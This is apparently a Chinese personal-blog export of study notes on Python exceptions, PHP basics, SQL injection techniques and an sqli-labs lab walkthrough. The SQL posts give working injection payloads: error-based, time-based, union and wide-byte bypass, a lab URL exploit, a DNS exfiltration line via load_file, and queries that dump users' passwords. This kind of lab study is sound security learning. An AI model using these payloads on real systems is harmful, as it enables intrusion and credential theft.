把数据对象以特定格式保存到给定文件里 pickling.load( )从文件中取出已保存的对象时, pickle 知道如何恢复这些对象到它们本来的格式 marshal提供类似字典和文件的对象，可以完成字符串的永久性存储 shelve同时具备pickling和marshal的功能 异常处理异常概述背景 什么是异常？举个例子，我们将“建房子”看出一个程序，这里涉及到材料准备、图纸设计、装修施工等各个环节 整个建房子的过程，可能出现各种各样的问题，材料是否准备充足？施工方是否人员到齐？设计是否有存在问题？装修是否有偷工减料？ “建房子”这事情一个系统工程，任何一个环节出现问题，这个事件就无法进行，例如没有材料或者工人没到场等等；这里程序运行就相当于“建房子”的过程 定义 程序运行会出现各种各样的问题，例如语法编写错误或文件读写错误等，出现各种各样的bug 默认情况下，程序会马上停止执行，并根据错误情况，反馈异常情况（显示栈追踪） 本质上讲，异常是一种类，并且有很多子类，基类为BaseException 举例IOError输入输出异常 &gt;&gt;&gt; file1 = open(&apos;file.txt&apos;,&apos;r&apos;) Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; FileNotFoundError: [Errno 2] No such file or directory: &apos;file.txt&apos; 根本找不到‘file.txt’这个文件 ZeroDivisionError分母为0异常 &gt;&gt;&gt; a = 1 &gt;&gt;&gt; b = 0 &gt;&gt;&gt; print(a/b) Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; ZeroDivisionError: division by zero TypeError类型异常，操作对本类型失效 &gt;&gt;&gt; a = 1 &gt;&gt;&gt; b = &apos;a&apos; &gt;&gt;&gt; a + b Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; TypeError: unsupported operand type(s) for +: &apos;int&apos; and &apos;str&apos; ValueError参数异常，无效的参数 &gt;&gt;&gt; num = int(&apos;a&apos;) Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; ValueError: invalid literal for int() with base 10: &apos;a&apos; SyntaxError语法异常 &gt;&gt;&gt; a = 1 + File &quot;&lt;input&gt;&quot;, line 1 a = 1 + ^ SyntaxError: invalid syntax NameError名字异常，对象未定义 &gt;&gt;&gt; a + c Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; NameError: name &apos;c&apos; is not defined AttributeError属性异常，对象没有此属性/方法 &gt;&gt;&gt; b.counn() Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; AttributeError: &apos;str&apos; object has no attribute &apos;counn&apos; 异常处理概述 异常错误会导致程序中止运行，我们可以对异常进行捕获，进行进一步操作 异常所引发的栈追踪对用户不友好，对于提供给用户使用的软件，异常处理是非常用必要的 异常捕获try…except… 执行try语句，若没有异常，则正常执行，忽略except代码块 若出现异常，则跳过try语句，执行except代码块 try/except块的工作原理有点像if语句，if语句根据布尔表达式的结果决定如何做，而try/except块根据是否出现了异 捕获一个异常&gt;&gt;&gt; try: ... a = 1 ... b = &apos;hello&apos; ... print(a + b) ... except TypeError: ... print(&apos;error!please try again&apos;) ... error!please try again 捕获多个异常，同一处理结果except (TypeError, ValueError): 捕获多个异常，不同处理结果except TypeError : print &apos;Invalid type,Please enter an integer value!&apos; except ValueError: print &apos;Invalid value,Please enter an integer value!&apos; 捕获所有异常except : 捕获异常，与while循环语句结合&gt;&gt;&gt; def get_age(): ... while True: ... try: ... n = int(input(&apos;How old are you?&apos;)) ... return n ... except: ... print(&apos;please enter an integer value&apos;) ... &gt;&gt;&gt; get_age() How old are you? please enter an integer value How old are you?&gt;? 1 1 捕获异常，与else语句结合&gt;&gt;&gt; try: ... a = 1 ... b = 2 ... print(a) ... except TypeErrpr: ... print(&apos;invalid type,please try again&apos;) ... else: ... print(b) ... 1 2 异常清理finally语句用于实现异常清理，不管最终try语句是否有异常，都必须执行finally语句 例如打开一个文件进行操作，不管是否异常，都必须在处理之后将其关闭，通过finally语句可以解决 try…finallytry: file1 = open(&apos;file.txt&apos;,&apos;w&apos;) file1.read() finally: file1.close() print &apos;close the file1&apos; try…except…finallytry: file1 = open(&apos;file.txt&apos;,&apos;w&apos;) file1.read() except IOError: print &apos;IOError, please try again!&apos; finally: file1.close() print &apos;close the file1&apos; try…except…else…finallytry: file1 = open(&apos;file.txt&apos;,&apos;w+&apos;) file1.read() except IOError: print &apos;IOError, please try again!&apos; else: print &apos;good!&apos; finally: file1.close() print &apos;close the file1&apos; with…aswith open(&apos;file.txt&apos;,&apos;w&apos;) as f: f.read() 异常触发raiseRaise用于抛出异常，异常可以自己定义 raise [SomeException [, args [, traceback]]] 第一个参数，SomeExcpetion是触发异常的名字 第二个符号为可选的 args(比如参数,值),来传给异常 最后一项参数,traceback,同样是可选的 assertAssert断言是有条件地触发异常，如果不满足则抛出AssertionError异常 相比raise，多了条件判断；但是不用像raise一样，抛出各种异常类型 assert expression[, arguments]","categories":[{"name":"笔记","slug":"笔记","permalink":"https://perfect.xyz/categories/笔记/"}],"tags":[{"name":"python学习","slug":"python学习","permalink":"https://perfect.xyz/tags/python学习/"}]},{"title":"sql注入笔记","slug":"sql","date":"2018-08-02T13:40:53.570Z","updated":"2018-08-02T14:10:31.598Z","comments":true,"path":"2018/08/02/sql/","link":"","permalink":"https://perfect.xyz/2018/08/02/sql/","excerpt":"整理一些sql手工注入要用到的知识","text":"整理一些sql手工注入要用到的知识 Sql注入原理sql注入是讲sql代码添加到应用的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析并执行 Sql注入的本质是混淆数据和执行代码，使输入的数据变成可执行的语句 查询：select statement from table where condition 删除记录：delete from table where condition 更新记录：update table set field=value where condtion 添加记录：insert into table values(values) Sql注入的产生参数为单引号的时候，语句报错，因为单引号被当做代码执行了 这就是注入的产生 Sql注入的分类注入的分类布尔注入select * from table where id=1 and 1=1 报错注入select * from table where id=1 or updatexml(1,concat(0x21,database()),1) 可联合查询注入select name from user where id=-1 union select user() 可多语句查询注入where id =1 ; delete from user 基于时间注入select * from table where id=1 and sleep(3) 1其实跟1=1所产生的效果是一样的 不能使用空格的时候，使用&amp;&amp;代替 and 。 注入类型整形注入 and、or、运算符、1 like 1、1 in(1,2) 字符串注入 and、or、运算符’、1’ like ‘1 、1’ in (‘1’)# 搜索型注入 盲注基于时间select * from table where id 1 and (if(ascii(substr(database(),1,1))=100,sleep(4),null)) 基于布尔select * from table where id =1 and ascii(substr(database(),1,1))=100 黑盒内联式内联式是指查询注入sql代码后，原来的查询仍然全部执行 登录绕过： user=’’’ or “=” pass=”” or “=” 终止式终止式sql语句注入是指攻击者在注入带有注释符的sql代码，将语句的一部分注释掉，注释掉的语句不会被执行 user=’’’ or “=”--” pass=任意输入 数据库结构Information_schemaschemata表：提供了当前Mysql实例中的所有数据库信息 tables表:提供了关于数据库中的表的信息，表述了表属于哪个schema，表类型，表引擎，创建时间等信息 columns：提供表中的列信息，详细表述了某张表中的所有列已经每个列信息 宽字节注入Ascii占用一个字节 Gbk编码汉字占用2个字节 Utf-8编码汉字占用3个字节 在gbk编码的值，前面加一个%aa，那么解码的时候，会先将前面的%aa和第一个编码值一起编码 addslashes函数addslashes函数使用反斜线引用字符串，将输入的字符串前面加入一个反斜杠 绕过思路 在反斜杠前面再加个反斜杠，转义这个反斜杠 去掉反斜杠 宽字节注入的原理是利用mysql在gbk编码的时候，会认为两个字符是一个汉字 比如在反斜杠后面加上一个%aa，mysql编码的时候会把反斜杠和%aa一起编码成一个字，这样就消除了反斜杠 用%df去跟反斜杠去结合成新的一个字 只能用于消除内联式前面的单引号，在后面的自己的Union查询语句中，不能出现单引号，否则会被变成一个字干扰查询语句，用十六进制来表示要查的表名 http://103.238.227.13:10083/?id=0%df&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# 基于约束的攻击方式插入数据时，表有长度限制，比如32位，当插入的数据超过32位时，大于32位的字符会被丢掉 如果我插入admin ~ 2 ，~为32个空格，最后插入到数据库中时，会把admin后面的空格以及最后的2全部去掉，最后的结果是相当于创建了一个新的admin账号 靶机：118.89.219.210:49163 带外通道注入dnslosdnslos dns在解析的时候会留下日志，读取多级域名的解析日志，可以用于将信息传递出去 load_file()函数load_file() 读取文件并返回文件内容为字符串 文件必须位于服务器上，必须指定完整路径的文件，且有file权限。该文件必须所有字节可读，但文件内容必须小于max_allowed_packet 如果该文件不存在或者无法读取，就会返回null 跟注入有关的用法有些场合下，load_file函数会去请求一次dns解析select load_file(‘\\\\\\\\’,(sekect hex(user()),’123.weae.sda.io\\\\abc’))根据这条语句，mysql会把user()的值和123.weae.sda.io一起带到dns服务器中进行解析，从而将攻击者想要的信息带出来 需要有一台自己的dns服务器，让受攻击的服务器来自己的dns服务器解析 通过注册一些服务商，可以获得一个域名，所有这个域名的解析都可以从服务商那里获得，比如cere的域名就是weae.sda.io 正常情况下不会在这种地方做防护，算是一种可以从里面出来的小路 如果域名长度被限制了，可以使用Mid()函数来获取 域名前缀不支持特殊字符，如*，解决方法是用hex()或者其他加密函数，获得数据之后再解密 报错注入公式and (select 1 from (select count(*),concat (user(),floor(rand(0)*2))x from information_schema.tables group by x)a )rand()用于产生一个0~1的随机数 floor()向下取整数 rand()生成0~1的函数，使用floor函数向下取整，因为随机产生的值是在0~1之间，向下取整后固定为0，再将rand*2，得到的值就是随机的0或者1，在rand()中加了0之后，比如rand(0)，之后的序列是不会变的类似于php中的播种概念，基于时间产生的一个随机数，只要时间相同，产生的随机数都是相同的，这个0就是rand的一个种子，rand(0)产生的随机数是固定不变的 count(*)访问查询语句中总共有多少条语句 group函数用于分组 报错的原理当mysql遇到select count(*) from tables group by x;语句时，会建立一个虚拟的表，表中有键值以及其对应出现的次数 开始查询数据，取数据库的数据，然后查看虚拟表是否存在，不存在则插入新记录，存在则在count（*）字段中加1 取第一条记录，执行Floor(rand(0)*2)，发现结果为0（第一次计算），查询虚拟表，发现0的键值不存在，执行插入语句，插入Floor(rand(0)*2)，这时会计算第二次，然后继续往下，当查询到的值为0，但是插入时计算的值为1，但是1已经在了，所以一定会报错 rand(0)→01 1 01 1 第一次执行的时候为0，插入的时候插入了1 ，第二次执行的时候1，第三次执行的时候是0，要插入，但是插入的时候为1，就报错了 floor(rand()*2)报错由于没有加入随机因子，所以Floor(rand()*2)是不可测的，如果出现第二次计算和第四次计算的值是一样的话，则会报错 前面几条查询不能让虚拟表一开始就插入了0,1的键值，如果存在了，无论加入多少条都不会报错了 Updatexml函数updatexml(1,concat(0x73,(version())),0) 这个函数要求第二个参数必须是xpath格式的字符串，如果不符合，则会报错 Updatexml最大长度是32位的，所以有所局限，如果长度超过了32位则不会被显示出来 持续更新中~","categories":[{"name":"web安全","slug":"web安全","permalink":"https://perfect.xyz/categories/web安全/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://perfect.xyz/tags/sql注入/"}]},{"title":"php学习笔记-核心编程","slug":"phpstudy-3","date":"2018-07-29T00:55:48.955Z","updated":"2018-07-29T08:28:56.302Z","comments":true,"path":"2018/07/29/phpstudy-3/","link":"","permalink":"https://perfect.xyz/2018/07/29/phpstudy-3/","excerpt":"珍爱生命，远离php","text":"珍爱生命，远离php 前台后台数据的提交前台数据的提交getget方式就是将表单元素的name属性值与用户输入的数据，组织成对的形式，放在url传递到所请求的文件 直接在url上修改参数，可以模仿get方式提交数据 postpost方式就是将表单元素的name属性值与用户输入的数据，组织成对的形式，放在http协议中传递到所请求的文件 &lt;form action=&quot;8j.php&quot; method=&quot;post&quot;&gt; //method改为get就为get方式提交 &lt;label for=&quot;name&quot;&gt;用户名&lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;name&quot;&gt;&lt;/label&gt;&lt;br/&gt; &lt;label for=&quot;name&quot;&gt;密码&lt;input type=&quot;text&quot; name=&quot;pwd&quot; id=&quot;pwd&quot;&gt;&lt;/label&gt;&lt;br/&gt; &lt;input type=&quot;submit&quot; name=&quot;提交&quot;&gt; 后台数据的接受$_GET用于接收前台使用GET方式提交的数据 将前台传递过来的各个名值对中的名作为关联数组元素的键名，名值对中的值，作为关联数组元素的键值 $name = $_GET[&apos;name&apos;]; $pwd = $_GET[&apos;pwd&apos;]; $_POST用于接收前台使用POST方式提交的数据 接收数据的方式个GET方式一样，只是存放数据的位置不一样 $name = $_POST[&apos;name&apos;]; $pwd = $_POST[&apos;pwd&apos;]; $_REQUEST同时能够接受POST和GET方式提交的数据 特殊表单的提交对于复选框，在编写html时，需要在name属性值后面加[]，这个[]符号一旦被php接收后，会自动转换为数组","categories":[{"name":"笔记","slug":"笔记","permalink":"https://perfect.xyz/categories/笔记/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://perfect.xyz/tags/php学习/"}]},{"title":"sqli-libs解题思路-Basic Challenges","slug":"sqli-labs","date":"2018-07-19T11:53:08.726Z","updated":"2018-07-27T12:15:35.173Z","comments":true,"path":"2018/07/19/sqli-labs/","link":"","permalink":"https://perfect.xyz/2018/07/19/sqli-labs/","excerpt":"sqlmap之下，众生平等","text":"sqlmap之下，众生平等 less-1先是查询界面输入?id=’，报错大致能判断是一个字符型注入，输入id=1’ and ‘1’=’1测试一下有没有过滤注释符，在get方式输入#时，必须将#手动url编码成%23,因为用get方式传值时，#被认为是分割字符串，不会被当成数据用于查询数据库没有过滤注释符的字符型注入，用截断式来注入，先用order by判断有几个字段3列，接下来爆表名,注意要把id后面的参数改为0，不然不会爆出union后面的数据?id=0&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23接下来就爆列名了，对referers这个表有点好奇，于是就选用这个表?id=0&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;referers&#39; #居然没有爆出数据，检查之后发现语句没有问题，数据库中这个表本身就没有数据,太懒惰了最后还是换成了user表?id=0&#39; union select 1,group_concat(username),group_concat(password) from users %23 持续更新中~","categories":[{"name":"web安全","slug":"web安全","permalink":"https://perfect.xyz/categories/web安全/"}],"tags":[{"name":"sqli-libs","slug":"sqli-libs","permalink":"https://perfect.xyz/tags/sqli-libs/"}]},{"title":"php中一些比较实用的技巧","slug":"phpstudy-2","date":"2018-07-15T07:00:05.774Z","updated":"2018-07-18T02:06:44.620Z","comments":true,"path":"2018/07/15/phpstudy-2/","link":"","permalink":"https://perfect.xyz/2018/07/15/phpstudy-2/","excerpt":"整理一些可能会用到的东西","text":"整理一些可能会用到的东西 两个变量互换位置借助第三个变量$v1 = 10; $v2 = 20; $tmp = $v1; $v1 = $v2; $v2 = $vtmp; echo $v1,$v2; 利用加减法$v1 = 10; $v2 = 20; $v1 = $v1 + $v2; $v2 = $v1- $v2; $v1 = $v1 - $v2; echo $v1,$v2; 利用异或$v1 = 10; //$v1=01010 $v2 = 20; //$v2=10100 $v1 = $v1 ^ $v2; //$v1=11110 $v2 = $v1 ^ $v2; //$v2=01010 $v1 = $v1 ^ $v2; //$v1=10100 用异或来获取两个数直接的不同点，在拥有不同点的情况下遇到任何一个数都推出另外一个数，本质上跟加减法类似 进制转换函数dec decimal 十进制 bin binary 二进制 oct octet 八进制 hex hex 十六进制 将两个进制的简写写在一起即为进制转换函数 比如：decbin() 十进制转换为二进制 dechex() 十进制转换为十六进制 php中的输出语句echoecho在输出时将输出的内容转换为字符串再输出，所以只能输出标量数据，在输出true和false时，会输出1和字符空。再输出数组时，会报错 print()和echo一样,区别在于print()是一个函数，会返回值，而echo是语法结构，不会返回值 print_r()可以输出标量以及复合数据类型，但是布尔值还是只会输出1或者字符空 var_dump()可以输出值以及其类型 sprintf()用于格式化输出 语法： sprintf(格式化字符串，变量1，变量2，…..) 格式化占位符： %b 二进制 %d 十进制 %o 八进制 %f 浮点 %x 十六进制 &lt;?php $v1 = 255; echo sprintf(&apos;二进制为:%b&lt;br /&gt;十进制为:%d&lt;br /&gt;八进制为:%o&lt;br /&gt;十六进制为:%x&apos;,$v1,$v1,$v1,$v1); 结果： 二进制为：11111111 十进制为：255 八进制为：377 十六进制为：ff %f用于输出浮点数，默认显示小数后6位，可以指定显示几位小数，比如指定显示两位：%.2f PHP标签语法当在HTML插入PHP代码的时候使用PHP标签语法 &lt;?php for($i=1;$i&lt;=4;$i++){?&gt; &lt;span&gt;&lt;?php echo $i?&gt;&lt;/span&gt; &lt;?php }?&gt; // 结尾 } 前面必须要加空格，不然会报错 // if标签语法 // 标准语法 &lt;?php if(...):?&gt; // 语句体 &lt;?php endif ?&gt; // 简化语法 &lt;?php if(...){&gt; // 语句体 &lt;?php }?&gt; //for标签语法 // 标准语法 &lt;?php for(...):?&gt; // 循环体 &lt;?php endif ?&gt; &lt;?php for(...){?&gt; // 循环体 &lt;?php }?&gt; 系统函数日期和时间函数time() 用于获取当前时间的时间戳，单位是秒。时间戳是从时间原点至现在的一个秒数。 时间原点：计算机中规定从1970年1月1日0时0分0秒那一刻作为时间原点 microtime() 用于计算毫秒，毫秒永远小于1 date(format [,time]) 用于格式化时间信息 format用于格式化时间的字符串，time表示需要格式化的时间戳 mktime(时，分，秒，月，日，年) 用于获取一个指定的时间戳 strtotime(string) 讲一个以字符形式描述的时间转换为时间戳，可以快速运算出例如密码更换策略等 遍历数组while-each-list遍历使用while、each、list语法结构来遍历数组 eacheach(数组) 用于获取当前指针所指的键名与键值 $arr = [&apos;key&apos;=&gt;&apos;value&apos;]; print_r(each($arr)); Array ( [1] =&gt; value [value] =&gt; value [0] =&gt; key [key] =&gt; key ) listlist(); 将数组中的索引元素赋值给变量列表中的变量。 $arr = [10,20,30,40]; list($a, $b, $c, $d) = $arr; 用each+list遍历数组： $arr = array(&apos;one&apos;=&gt;&apos;1&apos;, &apos;two&apos;=&gt;&apos;2&apos;, &apos;three&apos;=&gt;&apos;3&apos;); while(list($k,$v) = each($arr)){ echo $k.&apos;=&gt;&apos;.$v,&apos;&lt;br/&gt;&apos;; } 先将each($arr)的值赋给list($k,$v)，然后拿list($k,$v)作为表达式，即$k,当遍历有值的时候，$k=true,当遍历到最后的null的时候$k=flase foreach-list遍历// php&gt;5.6 // 注意：list只能使用索引数组 $arr = [ [1,2,3,4] ]; foreach($arr as list($a, $b, $c, $d)){ echo $a,$b,$c,$d; } 数组算法排序法冒泡排序法注意内循环的条件与外循环的条件 外循环中，由于是交换两个数，只需要循环数组数-1即可 内循环中，由于每一个循环都会把最大值放到最右边，所以最右边的界限需要不断改变 $arr = [10,5,100,255,64,1]; $len = count($arr); for($i=1;$i&lt;$len ;$i++){ for($j=0;$j&lt;$len-$i;$j++){ if($arr[$j]&gt;$arr[$j+1]){ $temp = $arr[$j]; $arr[$j] = $arr[$j+1]; $arr[$j+1] = $temp; } } } foreach($arr as $value){ echo &apos;[&apos;.$value.&apos;],&apos;; } 插入排序法1、从第一个元素开始，第一个元素已经被排列 2、在取下一个元素，将其和已经排序的元素中从后往前比较 3、如果以排列元素大于新元素，那么交换两者位置 4、重复步骤3，直到以排序元素小于或者等于新元素 5、重复2-4步骤 $arr = [10,5,100,255,64,1]; for($i=1;$i&lt;count($arr);$i++){ $tmp = $arr[$i]; for($j=$i-1;$j&gt;=0;$j--){ if($arr[$j]&gt;$arr[$j+1]){ $arr[$j+1] = $arr[$j]; $arr[$j] = $tmp; } } } print_r($arr); 查找算法顺序查找法unction searchArr($arr, $search){ for($i=0;$i&lt;=count($arr);$i++){ if($arr[$i]==$search){ echo $search; break; } } } $arr = [10,5,100,255,64,1]; searchArr($arr, &apos;64&apos;); 二分查找法前提为数组有序并不重复 可以简单的把数组想象成一个轴，对轴进行二分 $arr = [1,2,3,4,5,6,12,15,17,18,32,55,73,74,89]; function searchArr($arr, $search){ $left = 0; $right = count($arr); while($left &lt;= $right){ $mid = ceil(($left + $right) / 2); if($search &gt; $arr[$mid]){ $left = $mid + 1; }elseif($search &lt; $arr[$mid]){ $right = $mid - 1; }else{ return &apos;yes&apos;; } } return &apos;no,not exists&apos;; } echo searchArr($arr, 15);","categories":[{"name":"笔记","slug":"笔记","permalink":"https://perfect.xyz/categories/笔记/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://perfect.xyz/tags/php学习/"}]},{"title":"php学习笔记-基础部分","slug":"phpstudy-1","date":"2018-07-13T08:13:35.753Z","updated":"2018-07-18T02:10:22.157Z","comments":true,"path":"2018/07/13/phpstudy-1/","link":"","permalink":"https://perfect.xyz/2018/07/13/phpstudy-1/","excerpt":"珍爱生命，远离php","text":"珍爱生命，远离php PHP基本语法php是一种服务器端嵌入html脚本语言，也就是说可以将php标签嵌入到html代码中 语法规则php每条语句后面必须有“;” php中的变量名必须区分大小写，函数名、方法名、类名不区分 PHP标记①&lt;?php ...?&gt; ②&lt;script language=&quot;php&quot;&gt;...&lt;/script&gt; ③&lt;? ... ?&gt; (默认关闭，需要手动开启) ④&lt;% ... %&gt; (默认关闭，需要手动开启) 在php.ini中开启 注释单行注释：//注释内容 多行注释：/*注释内容*/ 变量及操作概念变量是内存中用于临时存储数据的一个空间，这个空间有一个名字，名字就是变量名。变量名是用于对这个内存中的数据进行引用的。 变量语法： $变量名=值;说明： php中的变量必须以”$”开头 变量名只能包含字母、数字、下划线，只能以字母、下划线开头。 删除变量语法: unset(变量名) 可变变量1.通过一个变量来访问另一个变量 &lt;?php $v = &apos;age&apos; $age = &apos;20&apos; echo $v; echo $$v; ?&gt; 结果： age 20 2.通过一个变量来创建另一个变量 &lt;?php $v = &apos;age&apos; $vv = &apos;20&apos; echo $age; ?&gt; 结果： 20 预定义变量php为了我们预先定义了一组变量，这些变量会在不同的需求中使用 $_GET 用于前台表单使用get方式提交的数据 $_POST 用于前台表单使用post方式提交的数据 $_REQUEST 用于前台表单使用get或post方式提交的数据 $_SERVER 记录了服务器端与客户端的相关信息 $_COOKIE 一种会话技术 $_SESSION 一种会话技术 $_FILES 用于记录用户上传的文件信息 $_GLOBAL 用于记录全局变量 使用方法： print_r($_SERVER) 内存原理内存结构栈区保存的是变量名（术语称之为引用） 特点：对于CPU来说，读写速度是最快的 堆区存储的是是“复杂”的数据，比如数据、对象、字符串 数据段分为全局数据段和静态数据段 存储的是简单的数据，比如整型、浮点型、布尔值 （计算机能存储的最大整数为2147483647） 代码段存储的是源代码对应的机器指令 输出缓存只要是有输出指令，比如echo、print、var_dump。这些指令会将所有要输出的数据放在输出缓存中 php执行过程编译阶段进行语法检查、词法检查、代码优化 编译通过之后将源代码转换为机器指令 Parse error：编译阶段发生错误，语法有问题 执行阶段如果编译通过后，会将源代码对应的机器指令，保存在代码段，再开始执行代码段中的机器指令 例如： &lt;?php $v1 = 10; $v2 = $v1; $v2 = 20; echo $v1; ?&gt; 执行过程如下: 1、先通过编译阶段，将源代码存储在代码段中。 2、执行$v1=10，会在栈区开辟一个空间存储变量$v1，将数据保存到数据段的全局区，再将数据的物理地址赋给栈区的变量$v1。 3、执行$v2=$v1，在栈区开辟一个空间存储变量$v2，读取变量$v1的值，读取出来的数据保存在数据段全局区，将这个数据的地址赋值给栈区中的$v2。 4、执行$v2=20，找到栈区中的$v2，并根据地址找到数据段全局区对应的空间，将数据覆盖。 5、执行echo $v1，找到栈区中的变量$v1，并根据地址找到数据段全局区中的值，将值读取出来，并放入到输出缓存中。 6、程序执行结束，输出缓存中的数据会自动返回给apache，apache返回给浏览器，同时栈区、数据段、代码段中的数据会被系统清空 PHP嵌入到HTML的执行过程php功能模块在处理一个php文件时，它只会处理php代码，对于非php代码，它会原样输出 到输出缓存中，由输出缓存发给apche来解析html以及js代码等php仅处理&lt;?php?&gt;标签内的代码，js、html、css对php来说都是字符串 php中变量的传值方式赋值传值使用一个变量a为另一个变量b赋值时，传递的是变量a的值，这种赋值方式称为赋值传值 $a = 10 $b = $a echo $b 结果： 10 引用传值使用一个变量a为另一个变量b赋值时，传递的是变量a的地址，这种赋值方式称为引用传值 $a = 10; $b = &amp;$a; $b = 20; echo $a,$b; 结果： 20,20 执行$b = &amp;$a;时，由于多了一个&amp;符号，所以内存会在栈区中开辟一个空间存储变量$b,并将$a的物理地址赋值给$b。 执行$b = 20;时，根据$b的物理地址找到数据段全局区中的数据并覆盖，由于$a的物理地址也是这个地址，所以$a的值也被改为20。 常量常量是一种特殊的变量，也是用于存储数据。常量一旦定义就不允许修改其值，常量本身不允许删除 概念define（’常量名’，值）； const 常量名 = 值； 常量一旦被定义就不允许更改 常量的值只能是基本数据类型（标量数据类型） 常量默认区分大小写，一般常量在没命时，我们会使用全大写的形式 区别： define允许在分支结构（比如循环语句）中定义常量，但是const不允许 define在值后面加一个true，定义的常量将不区分大小写 常量的判断以及获取所有的常量常量的判断defined（‘常量名’） 比define多了一个d，判断返回布尔值 获取所有常量get_defined_constants(); 获取php中所有的常量 魔术常量__FILE__ 用于获取当前文件路径以及文件名 __DIR__ 用于获取当前文件的路径 __LINE__ 用于获取当前行号 __FUNCTION__用于获取函数的函数名 __METHOD__ 用于获取当前方法的方法名 __CLASS__ 用于获取当前类的类名 __NAMESPACE__用于获取当前空间的空间名 PHP中的数据类型数据类型的分类1.标量数据类型 int 整型 float 浮点型 boolean 布尔型string 字符串 2.复合数据类型 array 数组object 对象 3.特殊数据类型 null nullresource 资源类型 int型十进制$v=255 八进制以0开头，并且不能有超过7的数字 十六进制以0x开头，包含0-9、a-f 其他进制在显示时会自动转换为十进制 float型有小数点的数就成为浮点数 浮点数不可能在不丢失精度的情况下转为二进制格式，所以使用浮点数进行运算的时候会出现偏差 string型字符串即单引号或者双引号括起来的0个或多个字符 单引号在单引号内能被转义的字符串：\\’、\\\\ 单引号定义的字符串中的变量值不能被解析 双引号在双引号内能被转义的字符串：\\”、\\t、\\r、\\n、\\\\、\\$ 双引号定义的字符串中的变量值可以被解析（加{}可以插入变量） heredoc类似于双引号定义字符串，主要用于定义大段的字符串 语法： $heredoc = &lt;&lt;&lt;开始标记 大段文本 结束标记； 开始标记和结束标记必须相同 结束标记必须定格写 nowdoc:本质上和heredoc一样，只不过nowdoc为单引号书写 array型索引数组 数组元素下标是数值，这样的数组就是索引数组 关联数组 数组元素的下标是字符串，这样的数组就是管理数组 数组元素的访问$a = “\\&lt;h3>$_arry[AAA]\\&lt;/h3>“ or $a = “\\&lt;h3>{$_arry[‘AAA’]}&lt;/h3>“ 如果在一个字符串中想输出数组的元素，那么下标不需加引号 如果使用了{}来限制了数组，那么下标必须加引号 资源类型资源型数据类型是一个特殊的变量，程序员没有办法直接定义一个资源，必须使用php提供的函数获取资源。不被php管辖的变量都称为资源，比如与mysql的连接 $resource = fopen(&apos;data.txt&apos;,&apos;r&apos;); echo fgets($resource); 以读的方式打开data.txt，并将内容echo出来，$resource就是一个资源型数据 数据类型的转换自动转换当进行运算的两个数据类型不同的时候，php会进行自动转换 强制转换(interger)变量 将其他数据类型强制转换为整型 (float)变量 将其他数据类型强制转换为浮点型 (array)变量 将其他数据类型强制转换为数组 (object)变量 将其他数据类型强制转换为对象 (string)变量 将其他数据类型强制转换为字符串 (boolean)变量 将其他数据类型强制转换为布尔值 运算符赋值运算符= 将赋值号右边的值赋给左边的变量，左边必须是变量不能是式子 算数运算符+、-、*、/、% % 取膜，即求两数相除，除不尽的部分 在实际运用中，取膜用于判断奇偶数 自操作运算符++ 自增、–自减 前自增/减：先对变量的值自增/减1，再使用新值参与运算(先在内存中加1/减1，再把值从内存中拿出来) 后自增/减：先用变量的原值参与式子的运算，在对变量的值加/减1 &lt;?php $v = 10 $a = $v + ++$v + ++$v + ++$v + ++$v echo $v,$a 结果 61,14 其他$i+=2 $i-=2 $i*=2 $i/=2 $i%=2 字符串运算符.、.= :对字符串进行拼接 当.后面拼接的为一个数字，则数字和.之间要有一个空格，否则php会认为是小数点 比较运算符&gt;、&lt;、&gt;=、&lt;=、==、!=、===、!== == 用于判断两个数的值是否相同 === 用于判断变量的值与类型是否相等，相等则返回true ！= 用于判断两个变量的值是否不同 ！== 用于判断两个变量的值或类型至少有一方面不相同 逻辑运算符&amp;&amp; 逻辑与 || 逻辑或 ! 逻辑非 and 逻辑与，和&amp;&amp;运算规则相同，但是and优先级低于= or 逻辑或，和||运算规则相同，但是or优先级低于= 逻辑与短路$v1 = 10; $result = false &amp;&amp; ++v1; var_dump($result); // 10 因为逻辑与运算中有一个为FALSE，结果就为False，就没必要去计算第二个值的结果 逻辑或短路$v1 = 10; $result = true || ++v1; var_dump($v2); // 10 逻辑或运算中，只要有一个为True或能转换为True，结果就返回True，就没必要去计算第二个值的结果 逻辑非的一种用法在变量名前面加两个！，比如!!v1，意为把v1强制转换为布尔值 条件运算符三元运算符 语法: 表达式？表达式A：表达式B 先计算表达式是否成立，如果成立去表达式A的值，不成立救取表达式B的值 扩展： 变量？：表达式B 如果变量存在且值不为空，那么就取变量，否则取表达式B 错误控制运算符错误抑制符@ 错误抑制符 不显示错误信息 php.ini在php.ini中，将display_errors的值改为off，就不会显示错误信息 php.ini隐藏错误为全局隐藏，这个服务器下的所有页面的错误信息都会隐藏 脚本级的错误控制脚本级的错误控制仅限于当前的php脚本文件 ini_set(配置项名，值) 主要用于在php脚本中来设置php.ini中的配置项 ini_get（配置项) 主要用于获取php.ini配置文件中的配置项的值 循环语句分支结构ifif(条件1){ 语句体1 }else if(条件2){ 语句体2 }else{ 语句体3 } swichswitch(){ case 值1: 语句体 1 break; case 值2: 语句体 2 break; default: 缺省语句体 } 当一个语句体执行结束后，如果没有遇到break，则会继续执行下面一条语句体，且不会判断下面那条语句体前面的case 循环结构forfor(循环控制变量初始值;表达式;循环控制变量的更改){ 循环体 } 执行顺序： 1、首先执行循环控制变量初始化，此步仅执行一次 2、判断表达式是否成立，不成立跳出循环 3、执行循环体 4、执行循环控制变量的更改 5、判断表达式是否成立，不成立跳出循环 6、执行循环体 … 嵌套循环时，外层循环控制行，内层循环控制列 使用外层循环的控制变量来控制内层循环的次数 whilewhile(表达式){ 循环体 } 与for的区别：while用于循环次数未知的循环 执行顺序：判断表达式是否成立，不成立执行 